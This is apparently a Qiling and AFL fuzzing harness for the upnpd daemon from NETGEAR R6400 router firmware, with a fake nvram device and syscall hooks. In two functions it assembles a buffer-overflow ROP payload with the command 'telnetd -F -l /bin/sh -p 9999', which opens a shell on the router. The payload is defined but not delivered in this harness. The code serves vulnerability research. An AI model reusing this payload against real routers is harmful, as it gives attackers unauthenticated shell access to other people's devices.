import sys, threading, time, os, socket

sys.path.append("../..")
from qiling import *
from qiling.const import *
from qiling.os.posix.syscall.unistd import ql_syscall_vfork
import unicornafl
import pickle

unicornafl.monkeypatch()

class save_status:
    def __init__(self):
        self.all_mem = None
        self.all_reg = None

ss = save_status()


class Fake_nvram:
    def __init__(self, init_buf):
        self.buf = init_buf
        self.cur_offset = 0
        self.name = "[nvram]"

    def read(self, size):
        if size == 0x20000:
            return bytes(size)
        key = ql.mem.string(ql.os.function_arg[1])
        # print('reading ...', key, '@', hex(ql.reg.pc))

        if key.encode() in self.buf:
            _key = key.encode()
            ret = list(filter(lambda x: x.startswith(_key), self.buf.split(b"\x00")))[0]
            ret = ret.split(b"=")[1]
            return ret

    def write(self, s):
        self.buf = s
        _diff = len(s) - len(self.buf)
        return _diff

    def fstat(self):
        return -1

    def close(self):
        return 0

    def lseek(self, offset, origin=0, **kwargs):
        if origin == 0:  # seek to beginning of file
            self.cur_offset = offset

        elif origin == 1:  # seek to cur_offset + offset
            self.cur_offset += offset

        elif origin == 2:  # seek to the end of file
            _len = len(self.buf)
            self.cur_offset = 0 if _len == 0 else _len - 1

        return self.cur_offset


fake_nvram = Fake_nvram(b"\x00".join([
    b"upnpd_debug_level=0",
    b"upnp_turn_on=0",
    b"board_id=U12H332T77_NETGEAR",
    b"lan_ipaddr=192.168.0.1",
    b"friendly_name= (Gateway)",
]))


def my_recvfrom(ql, *argu, **kw):
    # if this address readble, RCE; otherwise DOS;
    addr_r7 = b"\xcc\x04\x10\x40"

    addr_rop0 = \
        b"\x24\x91\x01\x00"

    addr_rop1 = \
        b"\xcc\x04\x10\x40" \
        b"\x41\x41\x41\x41\x41\x41\x41\x41" \
        b"\x8f\x9c\x06\x00\x1e\x00\x00\x00" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xe4\xce\x00\x00"

    addr_rop2 = \
        b"\x78\x78\x01\x00"

    cmd = \
        b"telnetd -F -l /bin/sh -p 9999;" \
        b"\x00"

    data = b"\x41" * 0x604 + \
           addr_r7 + b"\x41" * 0x28 + addr_rop0 + \
           b"\x61" * 0x258 + addr_rop1 + cmd + \
           b"\x41" * 0x3ed + addr_rop2

    regreturn = 10#len(data)
    ql.os.definesyscall_return(regreturn)

def my_syscall_read(ql, read_fd, read_buf, read_len, *args, **kw):
    data = None
    if read_fd < 256 and ql.os.file_des[read_fd] != 0:
        try:
            data = ql.os.file_des[read_fd].read(read_len)
            ql.mem.write(read_buf, data)
            regreturn = len(data)
        except:
            regreturn = -1
    else:
        regreturn = -1
    # ql.nprint("read(%d, 0x%x, 0x%x) = %d" % (read_fd, read_buf, read_len, regreturn))

    # if data:
    #     ql.dprint(D_CTNT, "[+] read() CONTENT:")
    #     ql.dprint(D_CTNT, "%s" % data)
    ql.os.definesyscall_return(regreturn)


def bug_show(ql, *argu, **kw):
    print('++++++ R0 ++++++', hex(ql.reg.read("R0")))
    print('+++++ [R0] +++++', ql.mem.read(ql.reg.read("R0"), 0x100))
    print('\n\n+++Bug Here! R4==' + hex(ql.reg.read("R4")) + '!!!!!!!!!!\n\n')
    # exit(0)


def wr_flag(ql, *argu, **kw):
    ql.reg.write("R0", 0x1)
    # print("write success**********")


def mem_watch(ql, *argu, **kw):
    print("R0-mem", ql.mem.read(ql.reg.read("R0"), 0x100))
    print("-------------------------------------")
    print("R1-mem", ql.mem.read(ql.reg.read("R0"), 0x100))
    print("-------------------------------------")
    print("R7-mem", ql.mem.read(ql.reg.read("R7"), 0x100))


def wr_data(ql, *argu, **kw):
    # if this address readble, RCE; otherwise DOS;
    addr_r7 = b"\xcc\x04\x10\x40"

    addr_rop0 = b"\x24\x91\x01\x00"

    addr_rop1 = \
        b"\xcc\x04\x10\x40" \
        b"\x41\x41\x41\x41\x41\x41\x41\x41" \
        b"\x8f\x9c\x06\x00\x1e\x00\x00\x00" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xe4\xce\x00\x00"

    addr_rop2 = b"\x78\x78\x01\x00"

    cmd = b"telnetd -F -l /bin/sh -p 9999;\x00"

    # data = b"\x33\x32" \
    #         + b"\x41"*0x602 + \
    #             addr_r7 + b"\x41"*0x28 + addr_rop0 + \
    #             b"\x61"*0x258 + addr_rop1 + cmd + \
    #             b"\x41"*0x3ed + addr_rop2

    data = b"\x41" * (0x604 + len(addr_r7) + 0x28 + len(addr_rop0) +
                      0x258 + len(addr_rop1) + len(cmd) + 0x3ed + len(addr_rop2))
    data = b"\x41"
    src_addr = ql.reg.read("R1")
    ql.mem.write(src_addr, data)


def get_data_addr(ql, *argu, **kw):
    ql.mem.write(0x7ff4ad8c, b"\x41"*3333)
    print('write success')


def main(path, rootfs, input_file):
    def place_input_callback(uc, input, _, data):
        try:
            ql.mem.write(0x7ff4ad8c, input)
            return True
        except:
            return False

    def start_afl(_ql: Qiling):
        try:
            # print("Starting afl_fuzz().")
            if not _ql.uc.afl_fuzz(input_file=input_file,
                                   place_input_callback=place_input_callback,
                                   exits=[0x222D8]):
                print("Ran once without AFL attached.")
                os._exit(0)  # that's a looot faster than tidying up.
        except unicornafl.UcAflError as ex:
            if ex != unicornafl.UC_AFL_RET_CALLED_TWICE:
                raise

    ql = Qiling(path, rootfs, output="off", console=True, profile="r6400.ql")
    ql.restore(snapshot='snap')

    ql.add_fs_mapper("/dev/nvram", fake_nvram)
    ql.add_fs_mapper("/dev/urandom", "/dev/urandom")
    ql.set_syscall(0x2, ql_syscall_vfork)
    ql.set_syscall(292, my_recvfrom)
    ql.set_syscall(3, my_syscall_read)
    ql.multithread = False

    # ql.hook_address(get_data_addr, 0x222C4)

    # ql.hook_address(mem_watch, 0x222CC)
    # ql.hook_address(bug_show, 0xb80c)

    # --- Bug trigger at 0xB80C, R0=R4=can not access ---

    ql.hook_address(callback=start_afl, address=0x222C0)

    # try:
    beginpoint = 0x222C0
    endpoint = 0x222D8
    ql.run(begin=beginpoint, end=endpoint)
    os._exit(0)
    # except:
    #     print("\nFuzzer fault")
    #     os._exit(0)


if __name__ == "__main__":
    path = ["../firmwares/netgear/R6400/rootfs/usr/sbin/upnpd"]
    rootfs = "../firmwares/netgear/R6400/rootfs"

    main(path, rootfs, './afl_inputs/a')
    # main(path, rootfs, sys.argv[1])
